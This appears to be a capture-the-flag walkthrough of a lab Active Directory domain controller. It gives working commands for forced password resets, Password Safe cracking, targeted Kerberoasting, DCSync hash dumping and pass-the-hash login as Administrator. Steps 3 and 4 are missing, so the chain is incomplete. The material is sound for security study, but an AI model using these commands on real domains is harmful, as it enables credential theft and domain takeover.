Overview

A full-stack domain controller exposing the usual AD surface (SMB, LDAP, Kerberos, WinRM, FTP, ADCS endpoints). Starting from a single low-privilege credential, the box is solved by walking an object-control graph in BloodHound — each account controls the next via a Windows ACL edge — until a user with DCSync rights allows replicating the Administrator hash straight out of NTDS.dit.

TL;DR path

olivia → michael → benjamin → emily → ethan → Administrator

Recon

Full AD DC stack open: 21/ftp, 53, 88/kerberos, 135/139/445/smb, 389/3268/ldap, 464, 593, 636/ldaps, 5985/winrm, 9389 + high RPC ports. SMB signing required (no relay).

$ echo "10.129.84.158 administrator.htb DC.administrator.htb DC" | sudo tee -a /etc/hosts
$ sudo ntpdate -u 10.129.84.158   # sync clock → avoid Kerberos KRB_AP_ERR_SKEW
$ nxc smb 10.129.84.158 -u olivia -p 'ichlie******'   # foothold cred valid

Initial credential olivia : ichlie****** — valid over SMB (default access only), no WinRM, no FTP. BloodHound CE data collected and olivia marked Owned.

1 olivia → michael

Force-reset michael's password using olivia's GenericAll (binds LDAP/389 with signing — sidesteps the broken LDAPS 636 handshake that Certipy hit):

$ bloodyAD -u olivia -p 'ichlie******' -d administrator.htb \
      --host 10.129.84.158 set password michael 'NewPas*****'

Why not Kerberoast / shadow creds?

GenericAll over a user gives three interchangeable primitives: targeted Kerberoast, shadow credentials, and force reset. The first two failed here (uncrackable TGS; LDAPS reset), so the reset — loud but reliable — carried the chain.

2 michael → WinRM

$ nxc winrm 10.129.84.158 -u michael -p 'NewPas*****'   # (Pwn3d!)
$ evil-winrm -i 10.129.84.158 -u michael -p 'NewPas*****'

michael gets a shell but no flag. user.txt belongs to emily, further down the chain.

Group membership ≠ a fixed login

Remote Management Users is authorization. A failing login is authentication — check the credential (case, quoting, password-vs-hash) before blaming permissions. data 52e always means bad creds.

$ ftp 10.129.84.158

$ file Backup.psafe3   # verify it's a real Password Safe DB, not "data"

5 Crack the Password Safe

$ pwsafe2john Backup.psafe3 > pwsafe.hash
$ hashcat -m 5200 pwsafe.hash /usr/share/wordlists/rockyou.txt
# master password → tekier******
$ # open the safe and read stored entries:
$ python3 -c "from pypwsafe import PWSafe3; db=PWSafe3('Backup.psafe3', password='tekier******'); \
    [print(r.getTitle(), r.getUsername(), r.getPassword()) for r in db.records]"

The master password itself isn't the prize — the stored entries are. The safe held three: alexander, emily and emma. Spraying them against the DC shows only emily's is valid.

6 emily → WinRM + user.txt

$ nxc winrm 10.129.84.158 -u emily -p '**********'   # (Pwn3d!)
$ evil-winrm -i 10.129.84.158 -u emily -p '**********'
*Evil-WinRM* type C:\Users\emily\Desktop\user.txt

7 emily → ethan — targeted Kerberoast

BloodHound shows emily with GenericWrite over ethan. That's enough to write a servicePrincipalName on his account, make him Kerberoastable on demand, and crack the ticket offline:

$ sudo ntpdate -u 10.129.84.158   # Kerberos again: fix clock skew first
$ python3 targetedKerberoast.py -v -d administrator.htb -u emily -p '**********' --dc-ip 10.129.84.158
# sets a temporary SPN on ethan, requests the TGS, then removes the SPN
$ hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt
# → ethan : limpb*****

8 DCSync → Pass-the-Hash → root

ethan holds replication rights over the domain. Replicate the directory's secrets:

$ impacket-secretsdump 'administrator.htb/ethan:limpb*****@10.129.84.158'
# ...
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20b****************:::

The right half is Administrator's NT hash. NTLM authenticates with the hash directly — no cracking needed:

$ evil-winrm -i 10.129.84.158 -u Administrator -H 3dc553ce4b9fd20b****************
*Evil-WinRM* type C:\Users\Administrator\Desktop\root.txt   # 🏁

Don't crack an NTLM hash

The aad3b4… left half is the empty LM hash (noise). DCSync → Pass-the-Hash is the point: recovering plaintext buys nothing, and feeding LM:NT to hashcat -m 0 throws a token-length error. Use the NT half with -m 1000 only if plaintext is genuinely required.

Lessons & gotchas

  • ACL abuse is a graph, not a command. Each hop answers "what does this node control next?" — mark owned, read outbound control, repeat.
  • GenericAll has three interchangeable primitives (Kerberoast / shadow creds / force reset). When one stalls, fall back — don't get stuck cracking an uncrackable TGS.
  • GenericWrite over a user = Kerberoast on demand. Write an SPN, grab the TGS, crack it. This only works if the password is weak, which ethan's was.
  • NTLM hashes are for passing, not cracking. DCSync → PtH ends the box; plaintext is irrelevant.
  • data 52e = bad credentials, always. It caught a NewPas***** vs Newpas***** typo and a pass@host quoting bug.
  • Clock skew silently breaks Kerberos — sudo ntpdate -u <dc-ip> at session start.
  • FTP binary mode before pulling any non-text loot — ASCII mode corrupts .psafe3/.kdbx/archives.
  • Run impacket via the packaged impacket-secretsdump, not examples/secretsdump.py, to avoid module-path errors.
